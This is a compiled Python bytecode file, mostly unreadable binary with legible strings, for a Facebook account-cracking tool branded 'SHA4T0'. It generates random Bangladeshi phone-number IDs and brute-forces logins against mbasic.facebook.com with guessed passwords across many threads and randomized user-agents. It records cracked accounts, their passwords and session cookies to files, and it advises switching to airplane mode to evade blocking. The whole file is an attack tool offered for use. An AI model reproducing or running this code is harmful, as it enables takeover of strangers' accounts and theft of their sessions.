o
    ��'c�3  �                   @   sd  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey5   ed� e �d� Y nw zd dlZW n eyN   ed� e �d� Y nw d dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlmZ d d	lmZ d dlZd dl Z d dl	Z	d dlZd dlZd dl
Z
d dlZd dlZd dlZd dlZzd dlZd d	lmZ d dlZd d
lmZ W n ey�   e �d� e �d� Y nw dd� Zdd� Zg Zg Zed�D ]�Z dZ!e
�"dd�Z#e
�"dd�Z$dZ%e
�"dd�Z&dZ'e
�"dd�Z(e
�"dd�Z)e
�"dd�Z*e
�"dd�Z+dZ,e!� e#� de$� de%� e&� e'� e(� de)� de*� de+� de,� �Z-e�.e-� dZ/e
�0g d��Z#dZ$e
�0g d ��Z%e
�"dd!�Z&e
�0g d ��Z'd"Z(e
�"d#d�Z)d$Z*e
�"d%d&�Z+e
�"d'd(�Z,d)Z1e/� de#� d*e$� e%� e&� e'� d+e(� e)� de*� de+� de,� de1� �Z2e�.e2� q�ed,�D ]`Z3d-Z!e
�"dd�Z#e
�"dd�Z$e
�0g d ��Z%e
�0g d ��Z&e
�0g d ��Z'e
�0g d ��Z(e
�"dd�Z)d.Z*e
�"dd�Z+e
�"dd�Z,d/Z1e!� e#� d0e$� e%� e&� e'� e(� e)� e*� e+� de,� de1� �Z4�q�d1d2� Z-d3d4� Z5d a6g a7g a8d5d6� Z9d7d8� Z:d9d:� Z;d;d<� Z<d=d>� Z=d?d@� Z>dAdB� Z?dCdD� Z@e:�  dS )E�    Nu)   
 [×] requests module not installed!...
zpip install requestsu(   
 [×] Futures module not installed!...
zpip install futuresu$   
 [×] Bs4 module not installed!...
zpip install bs4)�BeautifulSoup)�ThreadPoolExecutor)�ConnectionErrorz5pip install mechanize requests futures==2 > /dev/nullzpython sr.pyc                   C   s   t �d� d S )N�clear)�os�system� r   r   �/sdcard/ahhh.pyr   %   s   r   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�zt?)�sys�stdout�write�flush�time�sleep)�u�er   r   r	   �masud(   s   2r   i'  z"Mozilla/5.0 (Narzo 50/3; Series60/�   �	   ZRealme�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9Z10Z11Z12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/c                  C   s�   zt dd��� �� } | D ]}t�|� qW d S    t�d�j}t dd�} t�	dt
|��}|D ]	}| �|d � q/t dd��� �� } Y d S )Nz	bbnew.txt�rz0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txt�wzline">(.*?)<r
   )�open�read�
splitlines�ugen�append�requests�get�text�re�findall�strr   )�uaZub�a�aaZunr   r   r	   �uaku[   s   �
rN   c                   C   s   t �  td� d S )Nu�  
[1;32m ::::::::  :::    :::     :::         ::: ::::::::::: :::::::  
[1;35m:+:    :+: :+:    :+:   :+: :+:      :+:      :+:    :+:   :+: 
[1;36m+:+        +:+    +:+  +:+   +:+    +:+ +:+   +:+    +:+  :+:+ 
[1;37m+#++:++#++ +#++:++#++ +#++:++#++:  +#+  +:+   +#+    +#+ + +:+ 
[1;31m       +#+ +#+    +#+ +#+     +#+ +#+#+#+#+#+ +#+    +#+#  +#+ 
[1;36m#+#    #+# #+#    #+# #+#     #+#       #+#   #+#    #+#   #+# 
[1;33m ########  ###    ### ###     ###       ###   ###     #######  [0m
[1;32mITS [1;36mNOT [1;33mFOR [1;35mNAME [1;35mIT'S [1;37mBRAND
[1;97m------------------------[1;97m------------------------
[1;33m [✓] AUTHOR   : SHA4T0
[1;34m [✓] GITHUB   : [41m[1;37mSHA4T0[0m    
[1;35m [✓] Facebook :  Shanto Khan
[1;36m [✓] POWER  : [1;32m SHA4T0[1;97m  
[1;32m [✓] Facebook Group : Anonymous Team-71
[1;37m------------------------[1;37m------------------------
)r   r   r   r   r   r	   �logoh   s   rO   c                 C   s<   g d�}|D ]}t d|  | �f tj��  t�d� qd S )N)z.   z..  z... z.... �r   )�printr   r   r   r   r   )rG   Ztitik�or   r   r	   �dynamic�   s
   �rS   c                  C   s:   t �  t�  td� td� td�} | dkrt�  d S d S )Nz[1] Random crack�/-----------------------------------------------z[?] Choose : �1)r   rO   rQ   �input�random_crack��optr   r   r	   �menu�   s   
�rZ   c                  C   s�   t �  t�  td� td� td� td� td� td�} | dkr't�  d S | dkr0t�  d S | d	kr9t�  d S | d
krBt�  d S td� t�  d S )Nz[1] BD Random Uid 6 Digit Crackz[2] BD Random Uid 8 Digit Creckz[3] BD Random Uid 7 Digit Creckz[0] BackrT   u   [➤] Choose : rU   �2�3r9   z![1;91mChoose valid option[0;97m)	r   rO   rQ   rV   �sixdigit�
eightdigit�
sevendigitrZ   rW   rX   r   r   r	   rW   �   s$   




rW   c            
      C   �4  g } t �  t�  td� td� td�}td� ttd��}t|�D ]}d�dd� td�D ��}| �|� q"td	d
��>}t �  t�  t	t
| ��}td| � td� td� td� td� | D ]}|| }|g}	|�t||	|� q`W d   � n1 s|w   Y  td� td� td� td� td� t�  d S )NuF   [✔] For BD, Enter 6 Digit Code [ Ex- 01789,01947,01825,01347,01691 ]rT   �   [✔] Input Your Code : �   [✔] How many Id You Want : � c                 s   �   � | ]	}t �tj�V  qd S �N��random�choice�string�digits��.0�_r   r   r	   �	<genexpr>�   �   � zsixdigit.<locals>.<genexpr>�   �   ��max_workers�   [✔] Total Ids : [1;92m�B   [1;37;1m[✔] BRUTE HAS BEEN STARTED...([1;92mBANGLADESH[1;97m)�7    USE FLIGHT ([1;91mAIRPLANE[1;97m) MODE BEFORE USE�&   [✓] Crack process has been completed�[?] Ids saved in ok.txt,cp.txt� Press Inter To Back Menu�r   rO   rQ   rV   �int�range�joinrD   �
ThreadPoolrJ   �len�submit�rcrackrZ   �
�userZkode�limitZnmbrZnmpZyaari�tlZguru�uid�pwxr   r   r	   r]   �   �:    ��

r]   c            
      C   r`   )Nu<   [✔] For BD, Enter 3 Digit Code [ Ex- 017,019,018,013,016 ]rT   ra   rb   rc   c                 s   rd   re   rf   rk   r   r   r	   rn   �   ro   zeightdigit.<locals>.<genexpr>�   rq   rr   rt   ru   rv   rw   rx   ry   rz   r�   r   r   r	   r^   �   r�   r^   c            
      C   r`   )NuA   [✔] For BD, Enter 4 Digit Code [ Ex- 0178,0194,0182,0134,0169 ]rT   ra   rb   rc   c                 s   rd   re   rf   rk   r   r   r	   rn   �   ro   zsevendigit.<locals>.<genexpr>�   rq   rr   rt   ru   rv   rw   rx   ry   rz   r�   r   r   r	   r_   �   r�   r_   c                 C   s�  t j�dttt�tt�f � t j��  �z0|D �]}t�	� }t
�t�at
�t�}|�d�j}t�dt|���d�t�dt|���d�t�dt|���d�t�dt|���d�dd| |d	d
�	}i dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d�d&d'�d(|�}|jd)||d*�j}	|j�� �� }
d+|
v r�d,�d-d.� |j�� �� D ��}|d/d0� }td1| d2 | d3 | d4 � td5d6��|d7 | d7 | d8 � t�|�  nFd9|
v �r(d,�d:d.� |j�� �� D ��}|d;d<� }td=| d> | d? � td@d6��|d7 | dA � t�|� t|t� t | t!�  nqtd7 atttt"j#� tt$� tt%� � t j��  W d S    Y d S )BNuk   [38;5;231m[ SHA4T0 ] CHECKING :[1;92m%s [38;5;231m[ ✔ ]OK:-[1;92m%s [38;5;231m[ ✘ ]CP:-[1;91m%s �https://mbasic.facebook.comzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"r9   zLog In)	Zlsd�jazoestZm_tsZliZ
try_numberZunrecognized_tries�email�pass�loginZ	authority�mbasic.facebook.com�methodZPOST�scheme�https�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�accept-encodingzutf-8�accept-languagezen-US,en;q=0.9�cache-control�	max-age=0z	sec-ch-uaz)" Not A;Brand";v="99", "Chromium";v="101"zsec-ch-ua-mobile�?1zsec-ch-ua-platformz	"Android"�sec-fetch-dest�document�sec-fetch-mode�navigate�sec-fetch-siteZnone�sec-fetch-user�upgrade-insecure-requestsrU   �
user-agentzghttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8��data�headersZc_user�;c                 S   �   g | ]
\}}|d  | �qS ��=r   �rl   �key�valuer   r   r	   �
<listcomp>%  �    zrcrack.<locals>.<listcomp>r�   �   u%   			[1;92m
[SHA4T0-OK]
[✔] User :  u   
[✔] Pass :  u    
[✅Cookie]z
[0;97mz/sdcar/ok.txtrL   z | z 
Z
checkpointc                 S   r�   r�   r   r�   r   r   r	   r�   ,  r�   �   �'   u+   			[38;5;231m
 [SHA4T0-CP] 
[✘] User :  u   
[✘] Pass :  z
[38;5;231mz/sdcard/cp.txtr
   )&r   r   r   �loopr   �oks�cpsr   rE   �Sessionrg   rh   rC   rK   �ugen2rF   rG   rH   �searchrJ   �group�postZcookiesZget_dict�keysr}   �itemsrQ   r@   rD   Zcek_apkZcookie�ceker�pw�self�id�ok�cp)r�   r�   r�   �psZsession�proZfree_fbZlog_dataZheader_freefb�loZlog_cookiesZcokiZcidr   r   r	   r�   �   s�   �



�
����������	�
���� $


"r�   c                 C   s�  d}dddddt ddd	d
dddddd�}t�� }z�|�d�}t|jd| tdd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�	|
�d�|
�d�i� q>t|jdt
|d � ||d�jd�}td| tf � tdt d ��| d! t d" � |d#7 }|�d$�}t|�d%kr�td&� W d S |D ]	}td'|j � q�W d S  ty� } z'td| tf � td(� td)t d ��| d! t d" � |d#7 }W Y d }~d S d }~ww )*Nz�Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]r�   r�   rU   r�   z!application/x-www-form-urlencodedz|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originr�   r�   r�   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8zgzip, deflatez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)ZHostr�   r�   �originzcontent-typer�   r�   zx-requested-withr�   r�   r�   r�   Zrefererr�   r�   z%https://mbasic.facebook.com/login.phpr�   )r�   r�   r�   T)r�   r�   Zallow_redirectszhtml.parserZform)Znhr�   Zfb_dtsgzsubmit[Continue]Zcheckpoint_datarV   �namer�   �actionr�   z[SHA4T0]%s|%s ----> CP       zcp/rL   �|r
   r   Zoptionr   z5[SHA4T0]---> Tap Yes / A2F (Cek Login Di Lite/Mbasicz[SHA4T0]---> %sz9---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/MbasiczOK/)r�   rE   r�   rF   �sopr�   r�   rG   �find�updaterJ   rQ   r@   r�   r   Zfind_allr   �	Exceptionr�   )r�   r�   rK   �headZses�hiZhoZjor�   ZlionZanjZkentr�   ZopsiZopsii�cr�   r   r   r	   r�   ;  s<   $
"
�$ 
� ��r�   )Ar   rE   �ImportErrorrQ   r   �concurrent.futuresZ
concurrentZbs4Zjsonr   rg   �datetimer   rH   �
subprocess�platformr   r�   r   Ztred�base64ri   r~   Z	mechanizeZrequests.exceptionsr   �ModuleNotFoundErrorr   r   rC   r�   r|   ZxdrL   Z	randrange�br�   �dr   �f�g�h�i�j�krN   rD   rM   rh   �lZuaku2�xZuakrO   r�   r�   r�   rS   rZ   rW   r]   r^   r_   r�   r�   r   r   r   r	   �<module>   s�   ���PH
�<
B>
>
